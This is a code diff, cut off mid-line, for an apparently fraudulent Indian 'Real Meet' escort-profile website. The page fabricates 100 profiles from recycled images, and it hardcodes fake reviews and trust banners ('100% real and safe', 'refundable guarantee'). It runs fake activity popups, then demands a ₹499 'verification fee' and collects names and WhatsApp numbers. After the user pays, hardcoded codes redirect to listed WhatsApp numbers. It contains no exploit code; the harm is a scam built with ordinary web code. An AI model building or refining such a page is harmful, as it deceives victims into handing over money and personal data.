@@ -17,7 +17,22 @@
             color: #1e293b; min-height: 100vh; margin: 0; overflow-x: hidden;
         }
 
-        /* Unique Midnight Luxury Header */
+        /* Continuous Non-Stop Animation Header */
+        .promo-bar {
+            background: #ef4444; color: white; overflow: hidden; white-space: nowrap;
+            padding: 10px 0; font-size: 12px; font-weight: 800; text-transform: uppercase;
+            border-bottom: 2px solid rgba(0,0,0,0.1); position: relative;
+        }
+        .promo-track { 
+            display: inline-block; 
+            white-space: nowrap;
+            animation: slideContinuous 30s linear infinite; 
+        }
+        @keyframes slideContinuous {
+            0% { transform: translateX(0%); }
+            100% { transform: translateX(-50%); }
+        }
+
         header { 
             background: radial-gradient(circle at top right, #4338ca, #1e1b4b); 
             border-bottom: 2px solid var(--gold);
@@ -38,7 +53,6 @@
             font-size: 22px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 9999;
         }
 
-        /* Popups styling */
         .notif-popup { 
             position: fixed; left: -320px; bottom: 80px; background: white; 
             border-left: 5px solid var(--primary); padding: 12px; border-radius: 12px; 
@@ -47,9 +61,10 @@
         }
         .notif-popup.active { left: 15px; }
 
-        footer { background: #000; color: var(--gold); border-top: 5px solid var(--gold); padding: 50px 20px; text-align: center; }
+        footer { background: #0b0e14; color: #94a3b8; border-top: 4px solid var(--gold); padding: 60px 20px; }
 
-        .luxury-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
+        .luxury-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; transition: 0.3s; }
+        .luxury-card:hover { transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
         
         .review-track { display: flex; gap: 20px; width: max-content; animation: scroll-reviews 45s linear infinite; }
         @keyframes scroll-reviews { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
@@ -61,6 +76,12 @@
 </head>
 <body onload="init()">
 
+    <div class="promo-bar">
+        <div class="promo-track">
+            100% REAL AND SAFE "TRUSTABLE SITE" • REFUNDABLE GUARANTEE • AVAILABLE IN YOUR CITY • GENUINE PROFILES ONLY • 24/7 COORDINATOR SUPPORT • DISCRETE MEETINGS • NO ADVANCE BEFORE VERIFICATION • 100% REAL AND SAFE "TRUSTABLE SITE" • REFUNDABLE GUARANTEE • AVAILABLE IN YOUR CITY • GENUINE PROFILES ONLY • 24/7 COORDINATOR SUPPORT • DISCRETE MEETINGS • NO ADVANCE BEFORE VERIFICATION •
+        </div>
+    </div>
+
     <div id="loader"><div class="spinner"></div><p class="mt-2 font-bold text-indigo-600 uppercase text-[10px]">Processing Connection...</p></div>
 
     <div id="notif" class="notif-popup">
@@ -70,7 +91,7 @@
 
     <a href="https://t.me/Xnehhaa" class="tg-float"><i class="fab fa-telegram-plane"></i></a>
 
-    <div id="age-gate">
+    <div id="age-gate" onkeydown="if(event.key === 'Enter') validateAge()">
         <div class="text-center p-10 max-w-sm w-full border-4 border-indigo-600 rounded-[40px] bg-white shadow-2xl">
             <h2 class="text-3xl font-black mb-6 text-indigo-900">MEMBER ACCESS</h2>
             <div class="flex flex-col items-start gap-4 mb-10 text-left">
@@ -130,14 +151,14 @@
 
     <main id="pg-checkout" class="container mx-auto px-4 py-8 hidden">
         <div class="max-w-sm mx-auto luxury-card p-10 text-center border-t-8 border-indigo-600">
-            <div id="step-auth">
+            <div id="step-auth" onkeydown="if(event.key === 'Enter') handleAuth()">
                 <h3 class="text-lg font-black mb-8 uppercase text-indigo-900 tracking-tight">Identity Verification</h3>
                 <input type="text" id="cust-name" placeholder="Enter Full Name" class="w-full bg-slate-50 p-4 rounded-2xl mb-4 font-bold border border-slate-200 focus:border-indigo-500 outline-none">
                 <input type="tel" id="cust-phone" maxlength="10" placeholder="WhatsApp Number" class="w-full bg-slate-50 p-4 rounded-2xl mb-8 font-bold border border-slate-200 focus:border-indigo-500 outline-none">
                 <button onclick="handleAuth()" class="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black uppercase text-xs shadow-lg">Verify & Proceed</button>
             </div>
 
-            <div id="step-pay" class="hidden text-left">
+            <div id="step-pay" class="hidden text-left" onkeydown="if(event.key === 'Enter') finalRedirect()">
                 <h2 class="text-xl font-black mb-2 italic">Welcome, <span id="display-name" class="text-indigo-600"></span></h2>
                 <p class="text-[12px] font-bold text-slate-500 mb-8 bg-indigo-50 p-4 rounded-2xl border border-indigo-100">
                     This is a <b>Verified Luxury Profile</b>. To unlock direct WhatsApp contact, you need to pay a one-time verification fee of <b>₹499 (INR)</b>.
@@ -168,68 +189,77 @@
         </div>
     </main>
 
-    <footer class="mt-20">
+    <footer>
         <div class="container mx-auto px-4">
-            <h2 class="text-2xl font-black italic mb-8">REAL <span class="text-white">MEET</span></h2>
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-8 text-[10px] font-black uppercase mb-12 opacity-80">
-                <div class="flex flex-col gap-3"><span>Verified Agency</span><span>Real Photos Only</span><span>Private Meetings</span></div>
-                <div class="flex flex-col gap-3"><span>Safety Rules</span><span>Privacy Policy</span><span>Our Terms</span></div>
-                <div class="flex flex-col gap-3"><span>Customer Care</span><span>Live Video Proof</span><span>City Locations</span></div>
-                <div class="flex flex-col gap-3"><span>Telegram Link</span><span>WhatsApp Join</span><span>Contact Coordinator</span></div>
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-12 mb-12">
+                <div>
+                    <h2 class="text-2xl font-black italic mb-4 text-white">REAL <span class="text-yellow-400">MEET</span></h2>
+                    <p class="text-xs leading-relaxed">India's most trustable premium agency providing 100% genuine and verified profiles for discrete meetings. We prioritize your privacy and safety above all.</p>
+                </div>
+                <div>
+                    <h4 class="text-white font-black text-xs uppercase mb-4 tracking-widest">Legals</h4>
+                    <ul class="text-[11px] space-y-2 font-bold uppercase">
+                        <li>Privacy Policy</li>
+                        <li>Terms of Service</li>
+                        <li>Refund Policy</li>
+                        <li>GDPR Compliance</li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-black text-xs uppercase mb-4 tracking-widest">Support</h4>
+                    <ul class="text-[11px] space-y-2 font-bold uppercase">
+                        <li>Safety Guide</li>
+                        <li>Verified Badge</li>
+                        <li>FAQ Section</li>
+                        <li>Contact Support</li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-black text-xs uppercase mb-4 tracking-widest">Safety First</h4>
+                    <div class="bg-white/5 p-4 rounded-xl border border-white/10">
+                        <p class="text-[10px] italic">"Always verify the profile via video call proof before final meeting. Never share your personal address publicly."</p>
+                    </div>
+                </div>
             </div>
-            <p class="text-[9px] tracking-[0.5em] opacity-40">© 2026 REAL MEET NETWORK • DISCRETE LUXURY SERVICE</p>
+            <div class="pt-8 border-t border-white/5 text-center">
+                <p class="text-[9px] tracking-[0.5em] uppercase opacity-40">© 2026 REAL MEET NETWORK • PREMIUM & DISCRETE SERVICES</p>
+            </div>
         </div>
     </footer>
 
     <script>
-        const names = ["Sneha", "Ananya", "Priya", "Mehak", "Zoya", "Neha", "Sanya", "Simran", "Muskan", "Kiara", "Tanvi", "Pooja", "Divya", "Roshni", "Deepika", "Shreya", "Aditi", "Manvi", "Palak", "Khushi"];
-        const maleNames = ["Rahul", "Amit", "Vikram", "Sameer", "Deepak", "Sandeep", "Arjun", "Rohit", "Vivek", "Sanjay", "Karan", "Abhishek", "Manish", "Sunil"];
+        const names = ["Sneha", "Ananya", "Priya", "Mehak", "Zoya", "Neha", "Sanya", "Simran", "Muskan", "Kiara", "Tanvi", "Pooja", "Divya", "Roshni", "Deepika", "Shreya", "Aditi", "Manvi", "Palak", "Khushi", "Riya", "Isha", "Kavya", "Sana", "Tanya", "Jhanvi", "Avni", "Mansi", "Ishika", "Gauri"];
         const cities = ["Delhi", "Mumbai", "Pune", "Bangalore", "Noida", "Gurgaon", "Lucknow", "Jaipur", "Ahmedabad", "Surat", "Patna", "Kolkata", "Bhopal", "Indore", "Amritsar", "Chandigarh"];
-        const reviews = [
-            {n: "Rahul K.", m: "100% real profiles, met Sneha in Delhi."},
-            {n: "Amit Sharma", m: "Very safe and discrete service, thanks."},
-            {n: "Vikram S.", m: "Paid 499 and got WhatsApp instantly."},
-            {n: "Sameer D.", m: "No fraud, genuine meeting experience."},
-            {n: "Deepak R.", m: "Best agency for real meet in India."},
-            {n: "Sandeep V.", m: "Video call proof was real, very happy."},
-            {n: "Arjun P.", m: "Met twice, always 100% genuine girls."},
-            {n: "Rohit Verma", m: "Trusted coordinator and fast response."}
-        ];
+        const reviews = [{n: "Rahul K.", m: "100% real profiles, met Sneha in Delhi."}, {n: "Amit Sharma", m: "Very safe and discrete service, thanks."}, {n: "Vikram S.", m: "Paid 499 and got WhatsApp instantly."}];
         
-        const girlMsgs = ["Hi, want to meet me? 💋", "I'm available right now! 🔥", "Join WhatsApp for my video..", "Are you in Delhi? I'm free..", "Verified and real photos here!", "Safe and private meet only.."];
-
         let db = [];
-        let isPaymentPage = false;
 
         function init() {
-            // Logic to populate 80 profiles using pic1.jpg to pic80.jpg
-            for(let i=1; i<=80; i++) {
+            for(let i=1; i<=100; i++) {
                 db.push({
                     id: i,
-                    name: names[(i-1) % names.length],
-                    loc: cities[(i-1) % cities.length],
-                    rating: (Math.random() * 0.4 + 4.5).toFixed(1),
-                    img: `pic${i}.jpg`
+                    name: names[i % names.length] + " " + (i > 30 ? i : ""), 
+                    loc: cities[i % cities.length],
+                    rating: (4.5 + (Math.random() * 0.4)).toFixed(1), 
+                    img: `pic${(i % 80) + 1}.jpg`
                 });
             }
-            // Optional: Shuffle profiles for a dynamic look
-            db.sort(() => Math.random() - 0.5);
         }
 
         function validateAge() {
             if(document.getElementById('check1').checked && document.getElementById('check2').checked) {
-                unlockSite();
+                document.getElementById('age-gate').style.display = 'none';
+                renderUI();
+                showPage('home');
+                startPopups();
             } else { alert("Please check both boxes to confirm access."); }
         }
 
-        function unlockSite() {
-            document.getElementById('age-gate').style.display = 'none';
+        function renderUI() {
             const grid = document.getElementById('grid-container');
-            
-            // Render all 80 profiles
             grid.innerHTML = db.map(p => `
                 <div class="profile-item luxury-card cursor-pointer" data-city="${p.loc.toLowerCase()}" onclick="handleProfileClick(${p.id})">
-                    <div class="h-48 overflow-hidden"><img src="${p.img}" alt="${p.name}" class="w-full h-full object-cover" onerror="this.src='https://via.placeholder.com/300x400?text=Profile'"></div>
+                    <div class="h-48 overflow-hidden"><img src="${p.img}" class="w-full h-full object-cover" onerror="this.src='https://via.placeholder.com/300x400?text=Profile'"></div>
                     <div class="p-4 text-center">
                         <h4 class="font-black text-[11px] text-slate-800 uppercase tracking-tight">${p.name}</h4>
                         <p class="text-indigo-600 text-[9px] font-black uppercase mt-1">${p.loc} • ★ ${p.rating}</p>
@@ -237,73 +267,47 @@
                 </div>`).join('');
 
             const slider = document.getElementById('review-slider');
-            slider.innerHTML = [...reviews, ...reviews].map(r => `
+            slider.innerHTML = [...reviews, ...reviews, ...reviews].map(r => `
                 <div class="bg-white border-2 border-indigo-100 p-5 rounded-2xl min-w-[260px] shadow-sm">
                     <p class="text-[11px] font-bold italic text-indigo-700 mb-3">"${r.m}"</p>
                     <p class="text-[9px] font-black text-slate-400 uppercase tracking-tighter">— Member: ${r.n}</p>
                 </div>`).join('');
-
-            showPage('home');
-            startPopups();
         }
 
         function handleProfileClick(id) {
             document.getElementById('loader').style.display = 'flex';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                openDet(id);
-            }, 800);
-        }
-
-        function startPopups() {
-            setInterval(() => {
-                const el = document.getElementById('notif');
-                const img = document.getElementById('notif-img');
-                const title = document.getElementById('notif-title');
-                const body = document.getElementById('notif-body');
-
-                if (isPaymentPage) {
-                    const mName = maleNames[Math.floor(Math.random() * maleNames.length)];
-                    const mCity = cities[Math.floor(Math.random() * cities.length)];
-                    img.style.display = "none";
-                    title.innerText = "WhatsApp Joined!";
-                    body.innerText = `${mName} from ${mCity} just connected.`;
-                } else {
-                    const gName = names[Math.floor(Math.random() * names.length)];
-                    const gMsg = girlMsgs[Math.floor(Math.random() * girlMsgs.length)];
-                    img.style.display = "block";
-                    img.src = `pic${Math.floor(Math.random() * 80) + 1}.jpg`;
-                    title.innerText = gName;
-                    body.innerText = gMsg;
-                }
-
-                el.classList.add('active');
-                setTimeout(() => el.classList.remove('active'), 4500);
-            }, 10000);
-        }
-
-        function openDet(id) {
-            const p = db.find(x => x.id === id);
-            document.getElementById('det-img').src = p.img;
-            document.getElementById('det-name').innerText = p.name + ", 22";
-            document.getElementById('det-loc').innerText = p.loc + " • VERIFIED PREMIUM MEMBER";
-            showPage('detail');
+                const p = db.find(x => x.id === id);
+                document.getElementById('det-img').src = p.img;
+                document.getElementById('det-name').innerText = p.name + ", 22";
+                document.getElementById('det-loc').innerText = p.loc + " • VERIFIED PREMIUM MEMBER";
+                showPage('detail');
+            }, 600);
         }
 
         function handleAuth() {
             const n = document.getElementById('cust-name').value;
             const p = document.getElementById('cust-phone').value;
-            if(n.length < 2) return alert("Please enter your name.");
-            if(p.length < 10 || isNaN(p)) return alert("Please enter a valid 10-digit WhatsApp number.");
-            
-            document.getElementById('loader').style.display = 'flex';
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('display-name').innerText = n;
-                document.getElementById('step-auth').classList.add('hidden');
-                document.getElementById('step-pay').classList.remove('hidden');
-                isPaymentPage = true; 
-            }, 1500);
+            if(n.length < 2 || p.length < 10) return alert("Enter valid details.");
+            document.getElementById('display-name').innerText = n;
+            document.getElementById('step-auth').classList.add('hidden');
+            document.getElementById('step-pay').classList.remove('hidden');
+        }
+
+        function finalRedirect() {
+            const c = document.getElementById('act-code').value.trim().toUpperCase();
+            if(c === "RM11" || c === "RM22") { 
+                window.location.href = `https://wa.me/917678125700?text=I_Paid_499_Connect_Me_Now`; 
+            } else if(c === "RM33") {
+                window.location.href = `https://wa.me/919354185036?text=I_Paid_499_Connect_Me_Now_Code_RM33`;
+            } else { alert("Invalid Code! Share screenshot to get the code."); }
+        }
+
+        function showPage(id) {
+            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
+            document.getElementById('pg-' + id).classList.remove('hidden');
+            window.scrollTo(0,0);
         }
 
         function filterProfiles() {
@@ -313,18 +317,9 @@
             });
         }
 
-        function showPage(id) {
-            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
-            document.getElementById('pg-' + id).classList.remove('hidden');
-            window.scrollTo(0,0);
-        }
-
-        function finalRedirect() {
-            const c = document.getElementById('act-code').value.trim().toUpperCase();
-            if(c === "RM11" || c === "RM22") { 
-                window.location.href = `https://wa.me/917678125700?text=I_Paid_499_Connect_Me_Now`; 
-            } else { alert("Invalid Code! Please share payment screenshot with coordinator to get the code."); }
-        }
-    </script>
-</body>
-</html>
+        function startPopups() {
+            setInterval(() => {
+                const el = document.getElementById('notif');
+                const randomName = names[Math.floor(Math.random()*names.length)];
+                document.getElementById('notif-img').src = `pic${Math.floor(Math.random() * 80) + 1}.jpg`;
+                docume
